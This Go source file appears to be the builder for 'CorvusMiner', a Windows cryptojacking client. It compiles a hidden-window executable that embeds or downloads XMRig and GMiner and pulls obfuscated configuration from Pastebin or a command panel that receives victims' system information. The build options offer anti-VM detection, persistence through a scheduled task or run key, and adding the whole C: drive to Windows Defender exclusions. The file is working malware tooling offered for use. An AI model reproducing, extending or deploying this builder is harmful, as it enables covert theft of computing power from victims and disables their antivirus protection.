package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Directories
var (
	clientDir string
	buildDir  string
)

// Reader for terminal input
var reader *bufio.Reader

// Command-line flags
var (
	panelURLFlag     = flag.String("panel-urls", "", "Panel URL(s) separated by commas")
	monitoringFlag   = flag.Bool("monitoring", false, "Enable process monitoring")
	debugFlag        = flag.Bool("debug", false, "Enable debug console")
	antiVMFlag       = flag.Bool("antivm", false, "Enable anti-VM detection")
	persistenceFlag  = flag.Bool("persistence", false, "Enable persistence")
	remoteMinersFlag = flag.Bool("remote-miners", false, "Download miners from panel instead of embedding")
	adminFlag        = flag.Bool("admin", false, "Require administrator privileges")
	outputFlag       = flag.String("output", "", "Output directory for the built binary")
	xmrigURLFlag     = flag.String("xmrig-url", "/resources/xmrig", "URL path for XMRig download (relative to panel URL)")
	gminerURLFlag    = flag.String("gminer-url", "/resources/gminer", "URL path for GMiner download (relative to panel URL)")
)

func init() {
	reader = bufio.NewReader(os.Stdin)

	// Resolve Client directory - look in parent or current directory
	clientDirRaw := findClientDir()
	var err error
	clientDir, err = filepath.Abs(clientDirRaw)
	if err != nil {
		// Fall back to relative path if Abs fails
		clientDir = clientDirRaw
	}
	buildDir = filepath.Join(clientDir, "build")
}

// findClientDir locates the Client directory
func findClientDir() string {
	// Try current directory first
	if _, err := os.Stat("./Client"); err == nil {
		return "./Client"
	}

	// Try parent directory (when running from Builder/)
	if _, err := os.Stat("../Client"); err == nil {
		return "../Client"
	}

	// Try absolute path based on executable location
	ex, err := os.Executable()
	if err == nil {
		exePath := filepath.Dir(ex)
		parentPath := filepath.Dir(exePath)
		candidatePath := filepath.Join(parentPath, "Client")
		if _, err := os.Stat(candidatePath); err == nil {
			return candidatePath
		}
	}

	// Default (will fail with better error message later)
	return "./Client"
}

// validateEmbeddedConfig validates that the embedded config file is valid JSON and readable
func validateEmbeddedConfig(configPath string) error {
	if _, err := os.Stat(configPath); err != nil {
		return fmt.Errorf("embedded config file not found: %v", err)
	}

	// Try to read the file to ensure it's accessible
	data, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("failed to read embedded config: %v", err)
	}

	// Validate it's valid JSON by attempting to unmarshal
	var jsonData interface{}
	if err := json.Unmarshal(data, &jsonData); err != nil {
		return fmt.Errorf("embedded config is not valid JSON: %v", err)
	}

	return nil
}

func main() {
	flag.Parse()

	logInfo("CorvusMiner Builder - Windows Platform")

	// If flags are provided, use non-interactive mode
	if *panelURLFlag != "" {
		if err := buildClientNonInteractiveWindows(); err != nil {
			logError("Build failed: %v", err)
			os.Exit(1)
		}
		return
	}

	// Otherwise, use interactive mode
	windowsMain()
}

// Logging utilities
func logInfo(format string, args ...interface{}) {
	fmt.Printf("[INFO] "+format+"\n", args...)
}

func logError(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
}

func logSuccess(format string, args ...interface{}) {
	fmt.Printf("[SUCCESS] "+format+"\n", args...)
}

// checkWindowsDependencies verifies Visual Studio/CMake and build tools are installed
func checkWindowsDependencies() error {
	logInfo("Checking Windows build dependencies...")

	deps := []string{
		"cmake",
	}

	for _, dep := range deps {
		cmd := exec.Command("where", dep)
		if err := cmd.Run(); err != nil {
			logError("%s not found. Install from: https://cmake.org/download/", dep)
			return err
		}
	}

	// Check for Visual Studio or MSBuild
	if err := checkVisualStudioOrMSBuild(); err != nil {
		return err
	}

	logInfo("All dependencies found")
	return nil
}

// checkVisualStudioOrMSBuild checks for Visual Studio or standalone MSBuild
func checkVisualStudioOrMSBuild() error {
	// Check for MSBuild in Visual Studio locations
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, vsPath := range vsLocations {
		if _, err := os.Stat(vsPath); err == nil {
			logInfo("Found MSBuild at: %s", vsPath)
			return nil
		}
	}

	// Try where command
	cmd := exec.Command("where", "msbuild.exe")
	if output, err := cmd.Output(); err == nil {
		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
		if len(lines) > 0 && lines[0] != "" {
			logInfo("Found MSBuild in PATH: %s", lines[0])
			return nil
		}
	}

	return fmt.Errorf("Visual Studio or MSBuild not found. Install Visual Studio Community 2026, 2022, or 2019")
}

// buildClientNonInteractiveWindows builds using command-line flags
func buildClientNonInteractiveWindows() error {
	logInfo("CorvusMiner Builder - Non-Interactive Mode (Windows)")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	panelURL := *panelURLFlag
	processMonitoring := *monitoringFlag
	debugConsole := *debugFlag
	antiVM := *antiVMFlag
	persistence := *persistenceFlag
	remoteMiners := *remoteMinersFlag
	requireAdmin := *adminFlag

	// Validate: remote miners requires panel URL (can't work with empty panel)
	if remoteMiners && panelURL == "" {
		return fmt.Errorf("remote miner loading requires panel URL (not available with GET config method)")
	}

	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)
	logInfo("  Remote Miners: %v", remoteMiners)
	logInfo("  Require Admin: %v", requireAdmin)

	// Non-interactive mode uses panel/POST method, no embedded config needed
	logInfo("Embedded Config: disabled (using panel/POST method)")

	// Use defaults for non-interactive panel mode (no embedded config)
	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence, remoteMiners, requireAdmin, true, true, false, "", false)
}

// buildClientWindows orchestrates the full build pipeline for Windows
func buildClientWindows() error {
	logInfo("CorvusMiner Builder - Windows Version")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	reader := bufio.NewReader(os.Stdin)

	// Get config method preference
	fmt.Print("\n[CONFIG METHOD]\nFetch config from Pastebin/GET endpoint? (y/n) [default: n]: ")
	configMethodInput, _ := reader.ReadString('\n')
	useGetConfig := strings.TrimSpace(configMethodInput) == "y"

	var panelURL string
	var configURL string
	var enableCPUMiner bool = true // default true
	var enableGPUMiner bool = true // default true
	var enableEmbeddedConfig bool  // Only for GET method, defaults to false

	if useGetConfig {
		// Get config URL(s) for direct GET (Pastebin focus)
		fmt.Print("\n[PASTEBIN/GET CONFIG]\nEnter Pastebin raw URL or config endpoint(s) separated by commas for fallback:\n  Example: https://pastebin.com/raw/xXnRDDjH\n \nURL(s): ")
		configURL, _ = reader.ReadString('\n')
		configURL = strings.TrimSpace(configURL)

		if configURL == "" {
			return fmt.Errorf("config URL cannot be empty when using GET method")
		}

		// Validate URLs
		urlCount := len(strings.Split(configURL, ","))
		logInfo("Using %d config URL(s) with fallback support", urlCount)

		// Ask which miners to include
		fmt.Print("\n[MINERS FOR PASTEBIN]")
		fmt.Print("Include CPU miner (XMRig)? (y/n) [default: y]: ")
		cpuInput, _ := reader.ReadString('\n')
		enableCPUMiner = strings.TrimSpace(cpuInput) != "n"

		fmt.Print("Include GPU miner (GMiner)? (y/n) [default: y]: ")
		gpuInput, _ := reader.ReadString('\n')
		enableGPUMiner = strings.TrimSpace(gpuInput) != "n"

		if !enableCPUMiner && !enableGPUMiner {
			return fmt.Errorf("at least one miner must be enabled")
		}

		// Embedded config is only for Pastebin/GET method (needs fallback)
		enableEmbeddedConfig = true
	} else {
		// Get panel URL(s) for POST method
		fmt.Print("\n[PANEL URL (POST METHOD)]\nEnter panel URL(s) separated by commas for fallback.\nINCLUDE /api/miners/submit at the end of each URL:\n  Example: http://127.0.0.1:8080/api/miners/submit\n  Example: http://panel.example.com:8080/api/miners/submit\n\nURL(s): ")
		panelURL, _ = reader.ReadString('\n')
		panelURL = strings.TrimSpace(panelURL)

		if panelURL == "" {
			return fmt.Errorf("panel URL cannot be empty when using POST method")
		}

		// Warn if user forgot the /api/miners/submit path
		if !strings.Contains(panelURL, "/api/miners/submit") {
			logError("WARNING: URLs do not contain '/api/miners/submit' - this may cause the miner to fail!")
			fmt.Print("Continue anyway? (y/n): ")
			continueInput, _ := reader.ReadString('\n')
			if strings.TrimSpace(continueInput) != "y" {
				return fmt.Errorf("build cancelled by user")
			}
		}

		// Validate URLs
		urlCount := len(strings.Split(panelURL, ","))
		logInfo("Using %d panel URL(s) with fallback support", urlCount)

		// Panel version does NOT get embedded config (has direct panel access)
		enableEmbeddedConfig = false
	}

	// Get monitoring preference
	fmt.Print("\n[OPTIONS]\nEnable process monitoring? (y/n): ")
	monitorInput, _ := reader.ReadString('\n')
	processMonitoring := strings.TrimSpace(monitorInput) == "y"

	// Get debug console preference
	fmt.Print("Enable debug console? (y/n): ")
	debugInput, _ := reader.ReadString('\n')
	debugConsole := strings.TrimSpace(debugInput) == "y"

	// Get anti-VM preference
	fmt.Print("Enable anti-VM detection? (y/n): ")
	antiVMInput, _ := reader.ReadString('\n')
	antiVM := strings.TrimSpace(antiVMInput) == "y"

	// Get persistence preference
	fmt.Print("Enable persistence (if ran as administrator scheduled task, if not runkey)? (y/n): ")
	persistenceInput, _ := reader.ReadString('\n')
	persistence := strings.TrimSpace(persistenceInput) == "y"

	// Get remote miners preference (only if using POST method with panel)
	var remoteMiners bool
	if !useGetConfig {
		fmt.Print("Download miners from panel instead of embedding? (y/n): ")
		remoteMinersInput, _ := reader.ReadString('\n')
		remoteMiners = strings.TrimSpace(remoteMinersInput) == "y"
	} else {
		// Remote loading not available with GET config (Pastebin)
		remoteMiners = false
		logInfo("Note: Remote miner loading is disabled (not available with GET config method)")
	}

	// Get admin privilege requirement
	fmt.Print("Require administrator privileges? (y/n): ")
	adminInput, _ := reader.ReadString('\n')
	requireAdmin := strings.TrimSpace(adminInput) == "y"

	// Get Windows Defender exclusion option
	fmt.Print("Add C: drive to Windows Defender exclusion? (y/n) [requires admin]: ")
	defenderInput, _ := reader.ReadString('\n')
	defenderExclude := strings.TrimSpace(defenderInput) == "y"

	var embeddedConfigPath string
	if enableEmbeddedConfig {
		// For Pastebin/GET method, use embedded fallback config from builder directory
		defaultConfigPath := "./embedded_config.json"

		logInfo("\n[EMBEDDED FALLBACK CONFIG - PASTEBIN MODE]")
		logInfo("Using embedded config: %s", defaultConfigPath)

		// Convert to absolute path for CMake
		abs, err := filepath.Abs(defaultConfigPath)
		if err != nil {
			abs = defaultConfigPath
		}
		embeddedConfigPath = abs
	}

	logInfo("\n[BUILD CONFIGURATION]")
	if useGetConfig {
		logInfo("Config Method: GET request from Pastebin/endpoint")
		logInfo("Config URL(s): %s", configURL)
		logInfo("CPU Miner (XMRig): %v", enableCPUMiner)
		logInfo("GPU Miner (GMiner): %v", enableGPUMiner)
		logInfo("Embedded Fallback Config: %v", enableEmbeddedConfig)
	} else {
		logInfo("Config Method: POST to panel with system info")
		logInfo("Panel URL(s): %s", panelURL)
		logInfo("Embedded Fallback Config: disabled (not needed for panel mode)")
	}
	logInfo("Process Monitoring: %v", processMonitoring)
	logInfo("Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)
	logInfo("  Remote Miners: %v", remoteMiners)
	logInfo("  Require Admin: %v", requireAdmin)
	logInfo("  Windows Defender C: Exclusion: %v", defenderExclude)
	if enableEmbeddedConfig && embeddedConfigPath != "" {
		logInfo("  Embedded Config Path: %s", embeddedConfigPath)
		logInfo("  Validating embedded config JSON...")
		// Validate the config file is readable and valid JSON
		if err := validateEmbeddedConfig(embeddedConfigPath); err != nil {
			return err
		}
		logInfo("✓ Embedded config validated (will be obfuscated by CMake)")
	}

	// Pass config file path if embedded config is enabled
	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, remoteMiners, requireAdmin, enableCPUMiner, enableGPUMiner, enableEmbeddedConfig, embeddedConfigPath, defenderExclude)
}

// executeBuildWindows performs the actual build process on Windows
func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, remoteMiners, requireAdmin, enableCPUMiner, enableGPUMiner, enableEmbeddedConfig bool, embeddedConfigPath string, defenderExclude bool) error {
	// Clean build directory first to ensure no stale CMake cache or files
	logInfo("Cleaning build directory: %s", buildDir)
	if err := os.RemoveAll(buildDir); err != nil {
		logError("Warning: Failed to remove build directory: %v", err)
	}
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return fmt.Errorf("failed to create build directory: %v", err)
	}

	// Backup source files
	backupDir := filepath.Join(clientDir, "backup")
	logInfo("Backing up source files to %s", backupDir)
	if err := backupSourceFiles(backupDir); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}
	defer func() {
		if err := restoreSourceFiles(backupDir); err != nil {
			logError("Failed to restore source files: %v", err)
		}
	}()

	// Modify panel URL or config URL
	srcFile := filepath.Join(clientDir, "src", "main.cpp")
	if useGetConfig {
		logInfo("Setting config GET URL(s) to: %s", configURL)
		if err := modifyConfigGetURL(srcFile, configURL); err != nil {
			return fmt.Errorf("failed to modify config URL: %v", err)
		}
	} else {
		logInfo("Setting panel URL(s) to: %s", panelURL)
		if err := modifyPanelURL(srcFile, panelURL); err != nil {
			return fmt.Errorf("failed to modify panel URL: %v", err)
		}
	}

	// Modify miner resources in .rc file based on user selection
	rcFile := filepath.Join(clientDir, "resources", "embedded_resource.rc")
	logInfo("Configuring miner resources...")
	logInfo("  CPU Miner (XMRig): %v", enableCPUMiner)
	logInfo("  GPU Miner (GMiner): %v", enableGPUMiner)

	if err := modifyResourceFile(rcFile, enableCPUMiner, enableGPUMiner); err != nil {
		return fmt.Errorf("failed to modify resource file: %v", err)
	}

	// Verify the file was modified
	logInfo("✓ Miner resources configured")

	// Toggle WIN32 flag for debug console
	if debugConsole {
		logInfo("Enabling debug console...")
	} else {
		logInfo("Disabling debug console (hiding window)...")
	}
	if err := toggleWin32Flag(debugConsole); err != nil {
		return fmt.Errorf("failed to toggle WIN32 flag: %v", err)
	}

	// Run CMake
	logInfo("Configuring project with CMake...")
	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole, remoteMiners, requireAdmin, enableCPUMiner, enableGPUMiner, enableEmbeddedConfig, embeddedConfigPath, defenderExclude); err != nil {
		return fmt.Errorf("CMake configuration failed: %v", err)
	}

	// Run MSBuild
	logInfo("Building project...")
	if err := runMSBuild(); err != nil {
		return fmt.Errorf("build failed: %v", err)
	}

	logSuccess("Build completed successfully!")
	logInfo("Output: %s/corvus.exe", buildDir)

	// If output flag is set, copy binary to specified location
	if *outputFlag != "" {
		srcBinary := filepath.Join(buildDir, "Release", "corvus.exe")
		if _, err := os.Stat(srcBinary); err != nil {
			// Try Debug folder if Release doesn't exist
			srcBinary = filepath.Join(buildDir, "Debug", "corvus.exe")
		}

		dstBinary := filepath.Join(*outputFlag, "corvus.exe")

		// Create output directory if it doesn't exist
		if err := os.MkdirAll(*outputFlag, 0755); err != nil {
			return fmt.Errorf("failed to create output directory: %v", err)
		}

		// Copy binary
		if err := copyFile(srcBinary, dstBinary); err != nil {
			return fmt.Errorf("failed to copy binary to output: %v", err)
		}

		logSuccess("Binary copied to: %s", dstBinary)
	}

	return nil
}

// runCMakeWindows runs CMake for Windows with Visual Studio generator
func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool, remoteMiners bool, requireAdmin bool, enableCPUMiner bool, enableGPUMiner bool, enableEmbeddedConfig bool, embeddedConfigPath string, defenderExclude bool) error {
	// List of generators to try in order
	generators := []string{
		"Visual Studio 17 2022",
		"Visual Studio 16 2019",
	}

	var lastErr error
	for i, generator := range generators {
		args := []string{
			"-G", generator,
			"-A", "x64",
			"-DCMAKE_BUILD_TYPE=Release",
		}

		if antiVM {
			args = append(args, "-DENABLE_ANTIVM=ON")
		}

		if persistence {
			args = append(args, "-DENABLE_PERSISTENCE=ON")
		}

		if debugConsole {
			args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
		}

		if remoteMiners {
			args = append(args, "-DENABLE_REMOTE_MINERS=ON")
		} else {
			// Only apply miner selection for embedded miners (Pastebin/GET method)
			if enableCPUMiner {
				args = append(args, "-DENABLE_CPU_MINER=ON")
			}

			if enableGPUMiner {
				args = append(args, "-DENABLE_GPU_MINER=ON")
			}
		}

		if requireAdmin {
			args = append(args, "-DENABLE_ADMIN_MANIFEST=ON")
		}

		if defenderExclude {
			args = append(args, "-DENABLE_DEFENDER_EXCLUSION=ON")
		}

		if enableEmbeddedConfig && embeddedConfigPath != "" {
			args = append(args, "-DENABLE_EMBEDDED_CONFIG=ON")
			args = append(args, fmt.Sprintf("-DEMBEDDED_CONFIG_JSON_INPUT=%s", embeddedConfigPath))
		}

		if configURL != "" {
			args = append(args, "-DCONFIG_GET_URL="+configURL)
		}

		args = append(args, "..")

		// Clean CMake cache if not the first attempt
		if i > 0 {
			logInfo("Cleaning CMake cache before trying %s...", generator)
			os.RemoveAll(filepath.Join(buildDir, "CMakeCache.txt"))
			os.RemoveAll(filepath.Join(buildDir, "CMakeFiles"))
		}

		cmd := exec.Command("cmake", args...)
		cmd.Dir = buildDir
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if i == 0 {
			logInfo("Running CMake in %s with %s", buildDir, generator)
		} else {
			logInfo("Trying alternate generator: %s", generator)
		}

		if err := cmd.Run(); err != nil {
			lastErr = err
			continue // Try next generator
		}

		// Success
		return nil
	}

	// All generators failed
	if lastErr != nil {
		return fmt.Errorf("cmake error (tried VS2022 and VS2019): %v", lastErr)
	}
	return fmt.Errorf("cmake error: all generators failed")
}

// runMSBuild runs MSBuild to compile the project
func runMSBuild() error {
	// Try multiple possible solution file names
	possibleSolutions := []string{
		filepath.Join(buildDir, "corvus.sln"),
		filepath.Join(buildDir, "CorvusMiner.sln"),
		filepath.Join(buildDir, "project.sln"),
	}

	var slnFile string
	for _, candidate := range possibleSolutions {
		if _, err := os.Stat(candidate); err == nil {
			slnFile = candidate
			break
		}
	}

	if slnFile == "" {
		// List available files for debugging
		logError("Solution file not found. Checked: %v", possibleSolutions)
		entries, err := os.ReadDir(buildDir)
		if err == nil {
			logError("Files in build directory:")
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".sln") {
					logError("  - %s", entry.Name())
				}
			}
		}
		return fmt.Errorf("solution file not found in %s", buildDir)
	}

	logInfo("Using solution file: %s", slnFile)

	// Find MSBuild executable
	msbuildPath := findMSBuild()
	if msbuildPath == "" {
		return fmt.Errorf("MSBuild not found in PATH or Visual Studio installation directories")
	}

	logInfo("Using MSBuild: %s", msbuildPath)

	// Run MSBuild with Release configuration
	cmd := exec.Command(msbuildPath, slnFile, "/p:Configuration=Release", "/p:Platform=x64", "/m")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logInfo("Running MSBuild...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("msbuild error: %v", err)
	}

	return nil
}

// findMSBuild locates the MSBuild executable
func findMSBuild() string {
	// Try standard Visual Studio locations (newest first)
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, path := range vsLocations {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	// Try PATH
	cmd := exec.Command("where", "msbuild.exe")
	if output, err := cmd.Output(); err == nil {
		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
		if len(lines) > 0 && lines[0] != "" {
			return lines[0]
		}
	}

	return ""
}

// windowsMain is the main entry point for Windows builds
func windowsMain() {
	if err := buildClientWindows(); err != nil {
		logError("Build failed: %v", err)
		os.Exit(1)
	}
}

// modifyPanelURL modifies the panel URL in main.cpp
func modifyPanelURL(filename, newURL string) error {
	content, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file %s: %w", filename, err)
	}

	contentStr := string(content)

	// Find the OBFUSCATE_STRING pattern in main.cpp
	// Pattern: OBFUSCATE_STRING("http://...")
	startMarker := `OBFUSCATE_STRING("`
	startIdx := strings.Index(contentStr, startMarker)
	if startIdx == -1 {
		logError("Could not find '%s' in %s", startMarker, filename)
		return fmt.Errorf("could not find OBFUSCATE_STRING pattern for panel URL in main.cpp")
	}

	// Find the opening quote
	quoteStart := startIdx + len(startMarker) - 1 // -1 to include the quote

	// Find the closing quote (handle escapes)
	quoteEnd := quoteStart + 1
	for quoteEnd < len(contentStr) {
		if contentStr[quoteEnd] == '\\' {
			quoteEnd += 2 // Skip escaped character
			continue
		}
		if contentStr[quoteEnd] == '"' {
			break
		}
		quoteEnd++
	}

	if quoteEnd >= len(contentStr) {
		return fmt.Errorf("could not find closing quote for panel URL")
	}

	// Replace the old URL with the new one
	before := contentStr[:quoteStart+1] // Include opening quote
	after := contentStr[quoteEnd:]      // Include closing quote onwards
	contentStr = before + newURL + after

	return os.WriteFile(filename, []byte(contentStr), 0644)
}

// modifyConfigGetURL modifies the config GET URL in main.cpp
func modifyConfigGetURL(filename, newURL string) error {
	content, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file %s: %w", filename, err)
	}

	contentStr := string(content)

	// Find: std::string configGetUrlStr = OBFUSCATE_STRING("");
	searchPattern := `std::string configGetUrlStr = OBFUSCATE_STRING("`
	startIdx := strings.Index(contentStr, searchPattern)
	if startIdx == -1 {
		logError("Could not find configGetUrlStr pattern in %s", filename)
		return fmt.Errorf("could not find configGetUrlStr OBFUSCATE_STRING pattern in main.cpp")
	}

	// Find the opening quote (it's right at the end of searchPattern)
	quoteStart := startIdx + len(searchPattern) - 1 // -1 because we want the quote character itself

	// Find the closing quote
	quoteEnd := quoteStart + 1
	for quoteEnd < len(contentStr) {
		if contentStr[quoteEnd] == '\\' {
			quoteEnd += 2 // Skip escaped character
			continue
		}
		if contentStr[quoteEnd] == '"' {
			break
		}
		quoteEnd++
	}

	if quoteEnd >= len(contentStr) {
		return fmt.Errorf("could not find closing quote for config GET URL")
	}

	// Replace the old URL with the new one
	before := contentStr[:quoteStart+1] // Include opening quote
	after := contentStr[quoteEnd:]      // Include closing quote onwards
	contentStr = before + newURL + after

	return os.WriteFile(filename, []byte(contentStr), 0644)
}

// toggleWin32Flag toggles the WIN32 flag in CMakeLists.txt
// When enableDebugConsole is true, we comment out WIN32 and -mwindows to show console
// When enableDebugConsole is false, we uncomment WIN32 and -mwindows to hide console
func toggleWin32Flag(enableDebugConsole bool) error {
	cmakePath := filepath.Join(clientDir, "CMakeLists.txt")
	content, err := os.ReadFile(cmakePath)
	if err != nil {
		return err
	}

	contentStr := string(content)

	// Use regex to handle both cases properly
	if enableDebugConsole {
		// Debug enabled: Comment out WIN32 and -mwindows to show console
		contentStr = strings.ReplaceAll(contentStr, "    WIN32", "    #WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    LINK_FLAGS \"-mwindows\"", "    #LINK_FLAGS \"-mwindows\"")
	} else {
		// Debug disabled: Uncomment WIN32 and -mwindows to hide console
		contentStr = strings.ReplaceAll(contentStr, "    #WIN32", "    WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    #LINK_FLAGS \"-mwindows\"", "    LINK_FLAGS \"-mwindows\"")
	}

	return os.WriteFile(cmakePath, []byte(contentStr), 0644)
}

// modifyResourceFile modifies the embedded_resource.rc to include/exclude miners based on selection
func modifyResourceFile(rcFile string, includeCPU bool, includeGPU bool) error {
	// Start with the header
	newContent := `#include "../include/resources.h"
`

	// Add XMRig resource if CPU miner is enabled
	if includeCPU {
		newContent += `EMBEDDED_XMRIG RCDATA "xmrig.exe"
`
	}

	// Add GMiner resource if GPU miner is enabled
	if includeGPU {
		newContent += `EMBEDDED_GMINER RCDATA "gminer.exe"
`
	}

	// If both are disabled, we still need at least something in the RC file
	// (it will be included but not loaded by main.cpp)
	if !includeCPU && !includeGPU {
		logError("Warning: Both CPU and GPU miners are disabled!")
		// Keep the xmrig resource as default fallback
		newContent += `EMBEDDED_XMRIG RCDATA "xmrig.exe"
`
	}

	return os.WriteFile(rcFile, []byte(newContent), 0644)
}

// backupSourceFiles backs up source files before modification
func backupSourceFiles(backupDir string) error {
	// Create backup directory
	if err := os.MkdirAll(backupDir, 0755); err != nil {
		return fmt.Errorf("failed to create backup directory: %v", err)
	}

	// Backup critical files
	filesToBackup := []string{
		filepath.Join(clientDir, "src", "main.cpp"),
		filepath.Join(clientDir, "CMakeLists.txt"),
	}

	for _, file := range filesToBackup {
		if _, err := os.Stat(file); err != nil {
			// File doesn't exist, skip
			continue
		}

		backupFile := filepath.Join(backupDir, filepath.Base(file))
		if err := copyFile(file, backupFile); err != nil {
			return fmt.Errorf("failed to backup %s: %v", file, err)
		}
	}

	return nil
}

// restoreSourceFiles restores source files from backup
func restoreSourceFiles(backupDir string) error {
	// Restore critical files
	filesToRestore := []string{
		"main.cpp",
		"CMakeLists.txt",
	}

	for _, fileName := range filesToRestore {
		backupFile := filepath.Join(backupDir, fileName)
		if _, err := os.Stat(backupFile); err != nil {
			// Backup file doesn't exist, skip
			continue
		}

		originalFile := filepath.Join(clientDir, "src", fileName)
		if fileName == "CMakeLists.txt" {
			originalFile = filepath.Join(clientDir, "CMakeLists.txt")
		}

		if err := copyFile(backupFile, originalFile); err != nil {
			return fmt.Errorf("failed to restore %s: %v", originalFile, err)
		}
	}

	return nil
}

// copyFile copies a file from source to destination
func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("failed to open source file: %v", err)
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("failed to create destination file: %v", err)
	}
	defer dstFile.Close()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	return nil
}
